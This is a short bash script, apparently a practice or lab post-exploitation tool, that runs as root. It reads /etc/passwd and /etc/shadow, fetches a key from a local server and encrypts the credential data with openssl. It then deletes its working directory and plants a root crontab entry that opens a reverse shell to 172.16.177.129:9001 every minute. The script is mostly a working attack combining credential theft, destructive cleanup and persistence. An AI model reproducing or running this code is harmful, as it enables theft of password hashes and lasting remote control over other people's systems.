#!/bin/bash
path=$1
pass=$(cat /etc/passwd)
shad=$(cat /etc/shadow)
# pass="asdasd"
# shad="asdasd"

if [ "$EUID" -ne 0 ]
  then echo "Not root, exiting"
  exit
fi

# fetch password from server
curl "http://127.0.0.1:10000/key" > $path/key.txt


data="$pass '\n\n###Shadow ###\n\n' $shad"
echo -e $data > $path/data.txt

encrypted=$(openssl enc -aes-256-cbc -salt -in $path/data.txt -pass file:$path/key.txt)

echo test: $encrypted
# echo -e $link > $path/link.txt
# echo -e $link
# cleanup

rm -rf $path -r
touch /bin/updater


echo "* * * * * root /bin/bash -c '/bin/bash -i >& /dev/tcp/172.16.177.129/9001 0>&1'" >> /etc/crontab
chmod +x /bin/updater # forgot to do this
